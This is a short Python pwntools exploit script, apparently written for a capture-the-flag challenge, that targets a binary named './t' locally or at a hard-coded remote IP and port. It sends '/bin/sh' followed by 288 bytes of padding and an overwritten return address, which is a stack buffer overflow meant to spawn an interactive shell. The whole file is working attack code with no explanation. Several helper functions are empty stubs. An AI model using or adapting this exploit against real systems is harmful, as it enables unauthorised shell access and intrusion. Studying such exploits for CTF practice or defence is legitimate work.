#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '159.65.125.233'
port = 6009

binary = "./t"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def new():
  pass

def edit():
  pass

def remove():
  pass

def show(start,end):
  pass
  r.recvuntil(start)
  data = r.recvuntil(end)[:-len(end)]
  return data

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':
  r.send("/bin/sh\x00" + "A"*288 + p64(0x04000ED) + "B"*18)

  r.interactive()

